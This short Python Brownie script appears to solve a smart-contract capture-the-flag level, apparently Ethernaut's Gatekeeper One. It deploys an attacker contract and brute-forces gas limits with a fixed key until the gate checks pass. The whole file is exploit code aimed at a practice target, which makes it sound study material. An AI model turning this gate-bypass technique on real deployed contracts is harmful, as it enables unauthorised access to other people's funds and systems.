from brownie import Trespasser1, accounts, web3, convert

def deploy(gatekeeper_addr):
  me = accounts.load("default")
  trespasser = Trespasser1.deploy(gatekeeper_addr, {'from': me})
  main(trespasser.address)

def main(trespasser_addr):
  me = accounts.load("default")
  trespasser = Trespasser1.at(trespasser_addr)
  for i in range(1, 8200):
    gas = 81910 - (8191 - i)
    try:
      trespasser.wrectIt("0x26bbE18a00007245", {'from':me, 'gas_limit': gas})
      print("Done")
      break
    except Exception as e:
      print("Failed at {}".format(gas))